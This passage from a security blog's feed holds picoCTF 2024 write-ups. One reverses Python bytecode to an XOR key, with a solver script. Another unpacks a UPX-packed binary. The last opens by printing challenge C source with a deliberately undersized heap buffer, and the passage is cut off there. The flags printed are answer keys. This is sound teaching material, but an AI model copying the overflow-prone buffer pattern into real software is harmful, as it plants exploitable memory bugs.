33 (&#x27;o&#x27;)</span><br><span class="line">100 BINARY_ADD</span><br><span class="line">102 STORE_NAME               1 (key_str)</span><br><span class="line"></span><br><span class="line">104 LOAD_NAME                1 (key_str)</span><br><span class="line">106 LOAD_CONST              34 (&#x27;3&#x27;)</span><br><span class="line">108 BINARY_ADD</span><br><span class="line">110 STORE_NAME               1 (key_str)</span><br><span class="line"></span><br><span class="line">112 LOAD_CONST              35 (&#x27;t&#x27;)</span><br><span class="line">114 LOAD_NAME                1 (key_str)</span><br><span class="line">116 BINARY_ADD</span><br><span class="line">118 STORE_NAME               1 (key_str)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>As we can see, many values are loaded onto a “key” <code>variable</code>. If we read it in order, it might seem as though the key is <code>J_o3t</code>. <strong>This is not the case.</strong></p><blockquote><p>Read carefully, as this was designed to confuse you. The order in which the constant is loaded on the stack determines whether it’s added to the front or the back of the string.<br>{: .prompt-info}</p></blockquote><ol><li></li></ol><ul><li><code>LOAD_CONST (&#39;J&#39;)</code>: This loads a constant “J” onto the stack.</li><li><code>STORE_NAME (key_str)</code>: The value at the top of the stack (“J”, in this instance) is popped off the stack and assigned to the variable <code>key_str</code>.<ul><li><code>key_str = &quot;J&quot;</code>.</li></ul></li></ul><ol start="2"><li></li></ol><ul><li><code>LOAD_CONST (&#39;_&#39;)</code>: This loads a constant “_“ onto the stack.</li><li><code>LOAD_NAME (key_str)</code>: This loads <code>key_str</code>, which is currently just “J”, as previously explained.</li><li><code>BINARY_ADD</code>: Combines both <code>_</code> and <code>key_str</code> (again, currently just “J”).</li><li><code>STORE_NAME (key_str)</code>: Stores these changes to <code>key_str</code>.<ul><li><code>key_str = &quot;J&quot;</code> –&gt; <code>key_str = &quot;_J&quot;</code>.</li></ul></li></ul><ol start="3"><li></li></ol><ul><li><code>LOAD_NAME (key_str)</code>: This loads <code>key_str</code>.</li><li><code>LOAD_CONST (&#39;o&#39;)</code>: This loads a constant “o” onto the stack.</li><li><code>BINARY_ADD</code>: Combines both “O” and <code>key-str</code>, effectively adding “” to <code>key_str</code>.</li><li><code>STORE_NAME (key_str)</code>: Stores these changes to <code>key_str</code>.<ul><li><code>key_str = &quot;_J&quot;</code> –&gt; <code>key_str = &quot;_Jo&quot;</code>.</li></ul></li></ul><ol start="4"><li></li></ol><ul><li><code>LOAD_NAME (key_str)</code> This loads <code>key_str</code>.</li><li><code>LOAD_CONST (&#39;3&#39;)</code>: This loads a constant “3” onto the stack.</li><li><code>BINARY_ADD</code>: This combine “3” and <code>key_str</code>.</li><li><code>STORE_NAME (key_str)</code>: Stores this to <code>key-str</code>.<ul><li><code>key_str = &quot;_Jo&quot;</code> –&gt; <code>key_str = &quot;_Jo3&quot;</code>.</li></ul></li></ul><ol start="5"><li></li></ol><ul><li><code>LOAD_CONST (&#39;t&#39;)</code>: This loads a constant “t” onto the stack.</li><li><code>LOAD_NAME (key_str)</code>: This loads <code>key_str</code>.</li><li><code>BINARY_ADD</code>: This combine “t” and <code>key-str</code>.</li><li><code>STORE_NAME (key_str)</code>.<ul><li><code>key-str = &quot;_Jo3&quot;</code> –&gt; <code>key_str = &quot;t_Jo3&quot;</code>.</li></ul></li></ul><h2 id="Generating-key-list"><a href="#Generating-key-list" class="headerlink" title="Generating key_list"></a>Generating <code>key_list</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">120 LOAD_CONST              36 (&lt;code object &lt;listcomp&gt; at 0x7f704e8a4d40, file &quot;snake.py&quot;, line 9&gt;) &gt;)</span><br><span class="line">122 LOAD_CONST              37 (&#x27;&lt;listcomp&gt;&#x27;)</span><br><span class="line">124 MAKE_FUNCTION            0</span><br><span class="line">126 LOAD_NAME                1 (key_str)</span><br><span class="line">128 GET_ITER</span><br><span class="line">130 CALL_FUNCTION            1</span><br><span class="line">132 STORE_NAME               2 (key_list)</span><br></pre></td></tr></table></figure><ul><li><code>120 LOAD_C NST 36(&lt;code object &lt;listcomp&gt; at ..., file &quot;snake.py&quot;, line 9&gt;) &gt;)</code>: This loads a constant at index 36 onto the stack, specifically, a code object for a <a href="https://www.simplilearn.com/tutorials/python-tutorial/list-comprehension-in-python">list comprehension</a>.<ul><li>Essentially, a piece of code that will create a list. This code object will be used to generate the list later.</li></ul></li><li><code>122 LOAD_CONST 37 (&#39;&lt;listcomp&gt;&#39;)</code>: This loads a constant at index 37 onto the stack. The constant in this case is the string “&lt;listcomp&gt;”. This will be used to identify this code object as a list comprehension once it’s actually executed.</li><li><code>124 MAKE_FUNCTION 0</code>: This is the simplest one, it simply creates a function from the code object and the string “&lt;listcomp&gt;” (which will be used for debugging and identification). When this new function object is called, it’ll execute the list comprehension code.</li><li><code>126 LOAD_NAME 1 (key_str)</code>: Loads the <code>key_str</code> variable that was explained in the previous section</li><li><code>128 GET_ITER</code>: Takes the value of <code>key_str</code>, which was just loaded, and gets an iterator over it. Assuming that <code>key_str</code> is a string, it’ll iterate over all its characters.</li><li><code>130 CALL_FUNCTION 1</code>: Calls the function was made in step 124, it passes the iterator from <code>key_str</code> as an argument to the list comprehension. The function runs the list comprehension, which will process the characters from <code>key_str</code>.</li><li><code>132 STORE_NAME 2 (key_list)</code>: The result of the list that was just made is stored in a variable named <code>key_list</code>. This is simply the final output of the list comprehension.</li></ul><p>In python, this might look something like this:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key_list = [<span class="built_in">ord</span>(item) <span class="keyword">for</span> item <span class="keyword">in</span> key]</span><br></pre></td></tr></table></figure><p>This is a simple list comprehension, where each elemtn in the list is an item&#x2F;character from <code>key_str</code>.</p><h2 id="Extending-key-list-if-it’s-shorter-than-input-list"><a href="#Extending-key-list-if-it’s-shorter-than-input-list" class="headerlink" title="Extending key_list if it’s shorter than input_list"></a>Extending <code>key_list</code> if it’s shorter than <code>input_list</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">134 LOAD_NAME                3 (len)</span><br><span class="line">136 LOAD_NAME                2 (key_list)</span><br><span class="line">138 CALL_FUNCTION            1</span><br><span class="line">140 LOAD_NAME                3 (len)</span><br><span class="line">142 LOAD_NAME                0 (input_list)</span><br><span class="line">144 CALL_FUNCTION            1</span><br><span class="line">146 COMPARE_OP               0 (&lt;)</span><br><span class="line">148 POP_JUMP_IF_FALSE      162</span><br><span class="line"></span><br><span class="line">150 LOAD_NAME                2 (key_list)</span><br><span class="line">152 LOAD_METHOD              4 (extend)</span><br><span class="line">154 LOAD_NAME                2 (key_list)</span><br><span class="line">156 CALL_METHOD              1</span><br><span class="line">158 POP_TOP</span><br><span class="line">160 JUMP_ABSOLUTE          134</span><br></pre></td></tr></table></figure><p><strong>The first half (before the line break):</strong></p><ul><li>Check lengths:<ul><li><code>len(key_list)</code> is compared to <code>len(input_list)</code>.</li><li>If <code>key_list</code> is shorter, then it is extended.</li><li>Otherwise, it just skips to the next part of the code.</li></ul></li></ul><p><strong>The second half (after the line break)</strong></p><ul><li>Extend <code>key_list</code>:<ul><li><code>key_list.extend(key_list)</code> duplicates <code>key_list</code> by adding its contents to itself.</li><li>After extending, the program jumps back (<code>JUMP_ABSOLUTE 134</code>) to recheck the lengths.</li><li>The program will continue to loop until <code>len(key_list)</code> is &gt;&#x3D; <code>len_(input_list)</code>.</li></ul></li></ul><p>An example of how this might work:</p><ul><li>Initial Values:</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">input_list = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>]</span><br></pre></td></tr></table></figure><ul><li>After extending once:</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><h2 id="XOR-Operation-between-input-list-and-key-list"><a href="#XOR-Operation-between-input-list-and-key-list" class="headerlink" title="XOR Operation between input_list and key_list"></a>XOR Operation between <code>input_list</code> and <code>key_list</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">162 LOAD_CONST              38 (&lt;code object &lt;listcomp&gt; at ...&gt;)</span><br><span class="line">164 LOAD_CONST              37 (&#x27;&lt;listcomp&gt;&#x27;)</span><br><span class="line">166 MAKE_FUNCTION            0</span><br><span class="line">168 LOAD_NAME                5 (zip)</span><br><span class="line">170 LOAD_NAME                0 (input_list)</span><br><span class="line">172 LOAD_NAME                2 (key_list)</span><br><span class="line">174 CALL_FUNCTION            2</span><br><span class="line">176 GET_ITER</span><br><span class="line">178 CALL_FUNCTION            1</span><br><span class="line">180 STORE_NAME               6 (result)</span><br></pre></td></tr></table></figure><ul><li><p>Offsets <code>162 - 166</code>:</p><ul><li>A code object for a list comprehension is loaded onto the stack.</li><li>A name label for the list comprehension (<code>&lt;listcomp&gt;</code>) is loaded, which is used solely for debugging purposes, like I mentioned previously.</li><li>The compiled code and its label are combined into a callable function that will execute the list comprehension once it’s called.</li><li>This list comprehension would look something like this:<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = [a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(input_list, key_list)]</span><br></pre></td></tr></table></figure></li></ul></li><li><p>Offsets <code>168</code>:</p><ul><li>The built-in <code>zip</code> function is loaded onto the stack.</li><li>This function will combine <code>input_list</code> and <code>key_list</code> into pairs.</li></ul></li><li><p>Offsets <code>170 - 172</code>:</p><ul><li>The variables <code>input_list</code> and <code>key_list</code> are loaded onto the stack.</li><li>Example:<ul><li><code>input_list = [4, 54, 41]</code>, <code>key_list = [116, 95, 74]</code></li></ul></li></ul></li></ul><blockquote><p>Note that these aren’t the actual values, I’m just using them as an example.<br>{: .prompt-info }</p></blockquote><ul><li>Offsets <code>174 - 180</code>:<ul><li>The <code>zip</code> function is called with 2 arguments: <code>input_list</code> and <code>key_list</code>. The result is an iterator of pairs like: <code>[(4, 116), (54, 95), (41, 74)]</code>.</li><li><code>CALL_FUNCTION (1)</code>: the function created for the list comprehension is called with the iterator of pairs.</li><li><code>STORE_NAME (result)</code>: The list that was just created from the list comprehension is stored in the variable <code>result</code>.</li></ul></li></ul><p>So, the list comprehension should:</p><ul><li>Iterate through each pair (a, b) from the zipped object.</li><li>Compute the XOR (a^b).</li><li>Add these results to the new list called <code>result</code></li></ul><h2 id="Converting-result-into-text"><a href="#Converting-result-into-text" class="headerlink" title="Converting result into text"></a>Converting result into text</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">182 LOAD_CONST              39 (&#x27;&#x27;)</span><br><span class="line">184 LOAD_METHOD              7 (join)</span><br><span class="line">186 LOAD_NAME                8 (map)</span><br><span class="line">188 LOAD_NAME                9 (chr)</span><br><span class="line">190 LOAD_NAME                6 (result)</span><br><span class="line">192 CALL_FUNCTION            2</span><br><span class="line">194 CALL_METHOD              1</span><br><span class="line">196 STORE_NAME              10 (result_text)</span><br></pre></td></tr></table></figure><ul><li><code>result</code> (which is a list of integers) is converted into characters using <code>chr()</code>.</li><li>These characters are then joined into a single string using <code>&#39;&#39;.join()</code>.</li><li>The final output is stored into <code>result_text</code> (our flag!).</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">input_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;snake&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        start = line.find(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">        end = line.find(<span class="string">&quot;)&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> start != -<span class="number">1</span> <span class="keyword">and</span> end != -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                number = <span class="built_in">int</span>(line[start + <span class="number">1</span>:end])</span><br><span class="line">                input_list.append(number)</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;t_Jo3&quot;</span></span><br><span class="line"></span><br><span class="line">key_list = [<span class="built_in">ord</span>(item) <span class="keyword">for</span> item <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(key_list) &lt; <span class="built_in">len</span>(input_list):</span><br><span class="line">    key_list.extend(key_list[:<span class="built_in">len</span>(input_list) - <span class="built_in">len</span>(key_list)])</span><br><span class="line"></span><br><span class="line">result = [a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(input_list, key_list)]</span><br><span class="line"></span><br><span class="line">result_text = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, result))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result_text)</span><br></pre></td></tr></table></figure><blockquote><p>Note: The <code>with</code> statement before the <code>key</code> is to automatically find the values of <code>input_list</code>. This isn’t necessary of course, it’s just to automate this further.<br>{: .prompt-info }</p></blockquote><p>flag: <code>picoCTF&#123;N0t_sO_coNfus1ng_sn@ke_516dfaee&#125;</code></p>]]></content>
    
    
    <summary type="html">Analyzing bytecode to reverse engineer an XOR key</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
    <category term="Reverse Engineering" scheme="https://rivers.sh/tags/Reverse-Engineering/"/>
    
    <category term="Python" scheme="https://rivers.sh/tags/Python/"/>
    
    <category term="Bytecode" scheme="https://rivers.sh/tags/Bytecode/"/>
    
    <category term="XOR" scheme="https://rivers.sh/tags/XOR/"/>
    
  </entry>
  
  <entry>
    <title>Packer</title>
    <link href="https://rivers.sh/posts/packer/"/>
    <id>https://rivers.sh/posts/packer/</id>
    <published>2024-10-30T04:00:00.000Z</published>
    <updated>2025-04-03T08:24:17.504Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>Reverse this linux executable?</p><p><a href="https://artifacts.picoctf.net/c_titan/21/out">binary</a></p><h2 id="Understanding-the-file"><a href="#Understanding-the-file" class="headerlink" title="Understanding the file"></a>Understanding the file</h2><p>The <code>file</code> command will give us some good foundational information as to what we’re dealing with.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; file out</span><br><span class="line">out: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header</span><br></pre></td></tr></table></figure><p>For now, all we need to keep in mind:</p><ul><li>It’s statically linked, so all of the required libraries are included in this binary, meaning it’s all self-contained.</li><li>The program is a 64-bit ELF <em>(Executable and Linkable Format)</em>.</li></ul><p>Next, we can run <code>strings out</code> to try and see the text inside the binary. For this command, I won’t be showing the entire output, since most of it is gibberish, but there is one thing that should catch our eye, and it’s all the way at the bottom of the output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; strings out</span><br><span class="line">UPX!</span><br><span class="line">UPX!</span><br></pre></td></tr></table></figure><p>A quick google search on UPX led me to <a href="https://upx.github.io/">this</a> site, the official UPX site, which states:</p><blockquote><p>“<em>UPX is a free, secure, portable, extendable, high-performance executable packer for several executable formats.</em>“</p></blockquote><p>This leads us to believe that this file has been packed using UPX, so let’s try unpacking it.</p><h2 id="Utilizing-UPX"><a href="#Utilizing-UPX" class="headerlink" title="Utilizing UPX"></a>Utilizing UPX</h2><p>To unpack (or uncompress) the binary, we’re obviously going to need UPX, since that’s what it was compressed with. install UPX on any APT based distros (Kali, Debian, Ubuntu, Mint, etc.), we can run <code>sudo apt install upx-ucl</code>.</p><p>Now, we just need to find the command to unpack our binary. I personally ran <code>man upx</code>, <code>man</code> being short for <code>manual page</code>- but a quick google search should yield the same result:</p><blockquote><p>“   Decompress:<br>       All UPX supported file formats can be unpacked using the -d switch, eg.  upx -d<br>       yourfile.exe will uncompress the file you’ve just compressed.”</p></blockquote><p>So, let’s try it out:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; upx -d out</span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2024</span><br><span class="line">UPX 4.2.4       Markus Oberhumer, Laszlo Molnar &amp; John Reiser    May 9th 2024</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">[WARNING] bad b_info at 0x4b718</span><br><span class="line"></span><br><span class="line">[WARNING] ... recovery at 0x4b714</span><br><span class="line"></span><br><span class="line">    877724 &lt;-    336520   38.34%   linux/amd64   out</span><br><span class="line"></span><br><span class="line">Unpacked 1 file.</span><br></pre></td></tr></table></figure><h2 id="Finding-the-flag"><a href="#Finding-the-flag" class="headerlink" title="Finding the flag"></a>Finding the flag</h2><p>Now that we’ve successfully unpacked the file, let’s try running <code>strings</code> again, but this time we’re going to combine it with <code>less</code>, a command similar to <code>cat</code>, but with more features (scrolling, searching).</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; strings out | less</span><br></pre></td></tr></table></figure><p>To search for a specific string, enter a simple slash, <code>/</code>, and then type what you’re looking for (<code>less</code> has familiar keybinds to <a href="https://www.vim.org/">vim</a>)</p><p>If you prefer <code>grep</code> that’s alright too either way, we should see what we’re looking for.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; strings out | grep &quot;flag&quot;</span><br><span class="line">Password correct, please see flag: 7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f33373161613966667d</span><br><span class="line">(mode_flags &amp; PRINTF_FORTIFY) != 0</span><br><span class="line">WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1.</span><br><span class="line">version == NULL || !(flags &amp; DL_LOOKUP_RETURN_NEWEST)</span><br><span class="line">flag.c</span><br><span class="line">_dl_x86_hwcap_flags</span><br><span class="line">_dl_stack_flags</span><br></pre></td></tr></table></figure><p>Obviously, this looks nothing like our flag, so it’s likely to be an encrypted flag.</p><h2 id="Decrypting-the-flag"><a href="#Decrypting-the-flag" class="headerlink" title="Decrypting the flag"></a>Decrypting the flag</h2><p>A great tool for decryption is <a href="https://gchq.github.io/CyberChef/">Cyberchef</a>. This can put our encrypted flag in the “input” field, and under “Operations” we can search for “Magic” and drag that into the “Recipe” field.</p><p>flag: <code>picoCTF&#123;U9X_UnP4ck1N6_B1n4Ri3S_371aa9ff&#125;</code></p>]]></content>
    
    
    <summary type="html">Reverse engineering a simple linux executable</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
    <category term="Reverse Engineering" scheme="https://rivers.sh/tags/Reverse-Engineering/"/>
    
    <category term="UPX" scheme="https://rivers.sh/tags/UPX/"/>
    
    <category term="Linux Executable" scheme="https://rivers.sh/tags/Linux-Executable/"/>
    
  </entry>
  
  <entry>
    <title>Heap 1</title>
    <link href="https://rivers.sh/posts/heap1/"/>
    <id>https://rivers.sh/posts/heap1/</id>
    <published>2024-10-22T04:00:00.000Z</published>
    <updated>2025-04-03T08:24:43.704Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>Can you control your overflow? Downloads the binary <a href="https://artifacts.picoctf.net/c_tethys/1/chall">here</a>. Downloads the source <a href="https://artifacts.picoctf.net/c_tethys/1/chall.c">here</a>.</p><p>Additional details will be available after launching your challenge instance.</p><h2 id="Understanding-chall-c"><a href="#Understanding-chall-c" class="headerlink" title="Understanding chall.c"></a>Understanding chall.c</h2><p>The code for your convenience:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"><span class="comment">// amount of memory allocated for input_data</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INPUT_DATA_SIZE 5</span></span><br><span class="line"><span class="comment">// amount of memory allocated for safe_var</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SAFE_VAR_SIZE 5</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> num_allocs;</span><br><span class="line"><span class="type">char</span> *safe_var;</span><br><span class="line"><span class="type">char</span> *input_data;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(safe_var, <span class="string">&quot;pico&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nYOU WIN\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Print flag</span></span><br><span class="line">        <span class="type">char</span> buf[FLAGSIZE_MAX];</span><br><span class="line">        FILE *fd = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        fgets(buf, FLAGSIZE_MAX, fd);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Looks like everything is still secure!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nNo flage for you :(\n&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_menu</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n1. Print Heap:\t\t(print the current state of the heap)&quot;</span></span><br><span class="line">           <span class="string">&quot;\n2. Write to buffer:\t(write to your own personal block of data &quot;</span></span><br><span class="line">           <span class="string">&quot;on the heap)&quot;</span></span><br><span class="line">           <span class="string">&quot;\n3. Print safe_var:\t(I&#x27;ll even let you look at my variable on &quot;</span></span><br><span class="line">           <span class="string">&quot;the heap, &quot;</span></span><br><span class="line">           <span class="string">&quot;I&#x27;m confident it can&#x27;t be modified)&quot;</span></span><br><span class="line">           <span class="string">&quot;\n4. Print Flag:\t\t(Try to print the flag, good luck)&quot;</span></span><br><span class="line">           <span class="string">&quot;\n5. Exit\n\nEnter your choice: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThislcome to heap1!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;I put my data on the heap so it should be safe from any tampering.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Since my data isn&#x27;t on the stack I&#x27;ll even let you write whatever &quot;</span></span><br><span class="line">           <span class="string">&quot;info you want to the heap, I already took care of using malloc for &quot;</span></span><br><span class="line">           <span class="string">&quot;you.\n\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    input_data = <span class="built_in">malloc</span>(INPUT_DATA_SIZE);</span><br><span class="line">    <span class="built_in">strncpy</span>(input_data, <span class="string">&quot;pico&quot;</span>, INPUT_DATA_SIZE);</span><br><span class="line">    safe_var = <span class="built_in">malloc</span>(SAFE_VAR_SIZE);</span><br><span class="line">    <span 